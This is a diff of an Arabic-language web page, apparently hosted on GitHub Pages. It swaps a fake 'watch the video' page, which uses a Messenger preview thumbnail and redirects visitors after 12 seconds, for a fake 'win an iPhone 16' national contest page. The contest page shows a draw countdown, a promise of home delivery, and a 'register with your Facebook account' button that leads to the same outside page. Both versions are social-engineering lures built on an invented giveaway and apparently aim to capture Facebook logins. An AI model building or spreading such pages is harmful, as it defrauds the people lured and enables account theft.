@@ -1,96 +1,151 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>شاهد الفيديو</title>
-
-  <!-- وسوم Open Graph (المعاينة في مسنجر) -->
-  <meta property="og:title" content="شاهد الفيديو">
-  <meta property="og:description" content="شاهد الفيديو الآن">
-  <!-- هذه الصورة هي المصغّر -->
-  <meta property="og:image" content="https://images.pexels.com/photos/1758144/pexels-photo-1758144.jpeg">
-  <meta property="og:image:width" content="1280">
-  <meta property="og:image:height" content="720">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://youcefcheria.github.io/Youcef/">
-
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>المسابقة الوطنية - اربح iPhone 16</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Poppins:wght@600;800&display=swap" rel="stylesheet">
   <style>
-    body{
-      margin:0;display:flex;justify-content:center;align-items:center;
-      height:100vh;background:#000;
+    :root {
+      --primary: #1877f2;
+      --secondary: #0a57c5;
+      --background: #f5f7fb;
+      --card: #fff;
+      --text: #222;
+      --muted: #6b7280;
+      --shadow: 0 10px 30px rgba(0,0,0,0.08);
+      --success: #16a34a;
+      --apple-gradient: linear-gradient(90deg, #ff4d4d, #ff9933, #33cc33, #3399ff, #cc33ff);
     }
-    .wrap{
-      position:relative;width:100%;max-width:720px;aspect-ratio:16/9;
-      overflow:hidden;border-radius:12px;background:#111;
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Cairo', sans-serif;
+      background: var(--background);
+      color: var(--text);
+      overflow-x: hidden;
     }
-    video{
-      width:100%;height:100%;object-fit:cover;display:block;
+    header {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      text-align: center;
+      padding: 40px 20px;
     }
-
-    /* زر التشغيل (دائرة سوداء بنصف شفافية) */
-    #startBtn{
-      position:absolute;top:50%;left:50%;
-      transform:translate(-50%,-50%);
-      width:90px;height:90px;cursor:pointer;
-      background:rgba(0,0,0,0.6);
-      border:none;border-radius:50%;
-      display:flex;justify-content:center;align-items:center;
+    header h1 { font-size: 28px; margin: 0 0 6px; font-weight: 700; }
+    header p.lead { font-size: 15px; margin: 0; color: #e6f0ff; }
+    .container { max-width: 960px; margin: 30px auto; padding: 20px; }
+    .card {
+      background: var(--card);
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      padding: 30px;
+      text-align: center;
+      position: relative;
     }
-    #startBtn::before{
-      content:"";
-      display:block;
-      width:0;height:0;
-      border-left:30px solid #fff;   /* المثلث */
-      border-top:18px solid transparent;
-      border-bottom:18px solid transparent;
-      margin-left:8px;
+    /* كتابة iPhone 16 بدل الصورة */
+    .iphone-text {
+      font-family: 'Poppins', sans-serif;
+      font-size: 64px;
+      font-weight: 800;
+      background: var(--apple-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+      margin-bottom: 25px;
+      text-shadow: 2px 2px 8px rgba(0,0,0,0.1);
     }
-
-    /* النص */
-    #watermark{
-      position:absolute;top:12px;left:12px;
-      color:rgba(255,255,255,0.85);
-      font-size:22px;font-weight:bold;
-      background:rgba(0,0,0,0.3);
-      padding:6px 12px;border-radius:6px;
-      opacity:0;transition:opacity .5s;
-      pointer-events:none;
+    .countdown { font-size: 20px; font-weight: 600; color: var(--secondary); margin-bottom: 20px; }
+    .note {
+      font-size: 15px;
+      color: var(--muted);
+      margin-bottom: 16px;
+      font-weight: 600;
     }
+    .fb-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 28px;
+      border-radius: 12px;
+      background: linear-gradient(90deg, #2d66c7, #1852c2);
+      color: #fff;
+      border: none;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 17px;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      text-decoration: none;
+    }
+    .fb-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 18px rgba(24,119,242,0.4); }
+    .fb-btn img { width: 22px; }
+    .delivery-note {
+      font-size: 18px; color: var(--success); font-weight: 700;
+      text-align: center; margin-top: 18px; display: flex; justify-content: center; align-items: center; gap: 8px;
+    }
+    .delivery-note img { width: 24px; height: 24px; }
+    footer { text-align: center; font-size: 13px; color: var(--muted); margin: 30px 0; }
   </style>
 </head>
 <body>
+  <header>
+    <h1>المسابقة الوطنية - اربح iPhone 16</h1>
+    <p class="lead">شارك الآن وفز بأحدث هواتف iPhone 16 — السحب كل ثلاثاء وجمعة لعدد 100 فائز من جميع الولايات</p>
+  </header>
 
-  <div class="wrap">
-    <video id="vid" muted playsinline>
-      <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4" type="video/mp4">
-      متصفحك لا يدعم فيديو HTML5
-    </video>
-    <div id="watermark"></div>
-    <button id="startBtn"></button>
-  </div>
+  <main class="container">
+    <section class="card">
+      <!-- كتابة iPhone 16 بخط كبير -->
+      <div class="iphone-text">iPhone 16</div>
+
+      <div id="countdown" class="countdown">الوقت المتبقي للسحب: جاري التحميل...</div>
+
+      <!-- النص بدل إدخال الهاتف -->
+      <p class="note">استخدم حسابك في فيس بوك للتسجيل التلقائي — نحن نتصل بك</p>
+
+      <!-- زر التسجيل -->
+      <a href="https://youcefcheria.github.io/Youcef/" id="fbRegister" class="fb-btn" target="_blank">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="fb" onerror="this.style.display='none'" />
+        سجل بإستخدام حسابك في فيس بوك
+      </a>
+
+      <span class="delivery-note">
+        <img src="https://cdn-icons-png.flaticon.com/512/679/679720.png" alt="توصيل" />
+        الهدية تصلك إلى باب منزلك
+      </span>
+    </section>
+  </main>
+
+  <footer>
+    © 2025 المسابقة الوطنية — جميع الحقوق محفوظة.
+  </footer>
 
   <script>
-    const video   = document.getElementById('vid');
-    const btn     = document.getElementById('startBtn');
-    const mark    = document.getElementById('watermark');
-    const TARGET  = "https://youcefcheria.github.io/Youcef/";
+    function getNextDraw() {
+      const now = new Date();
+      let day = now.getDay();
+      let target = new Date();
+      if(day <= 2) { target.setDate(now.getDate() + (2 - day)); }
+      else if(day < 5) { target.setDate(now.getDate() + (5 - day)); }
+      else { target.setDate(now.getDate() + ((2 + 7) - day)); }
+      target.setHours(18,0,0,0);
+      return target;
+    }
 
-    btn.addEventListener('click', async () => {
-      btn.disabled = true;
-      btn.style.display = "none";
-
-      // نص "انتظر قليلاً..." لمدة 4 ثوانٍ
-      mark.textContent = "انتظر قليلاً...";
-      mark.style.opacity = "1";
-      setTimeout(() => { mark.style.opacity = "0"; }, 4000);
-
-      try { await video.play(); } catch(e) { console.log("تعذر التشغيل:", e); }
-
-      // الانتقال بعد 12 ثانية
-      setTimeout(() => { window.location.href = TARGET; }, 12000);
-    });
+    function updateCountdown() {
+      const countdownEl = document.getElementById('countdown');
+      const now = new Date();
+      const next = getNextDraw();
+      const diff = next - now;
+      if(diff <= 0) { countdownEl.textContent = 'السحب جارٍ الآن!'; return; }
+      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+      countdownEl.textContent = `الوقت المتبقي للسحب: ${days}ي ${hours}س ${minutes}د ${seconds}ث`;
+    }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
   </script>
-
 </body>
 </html>
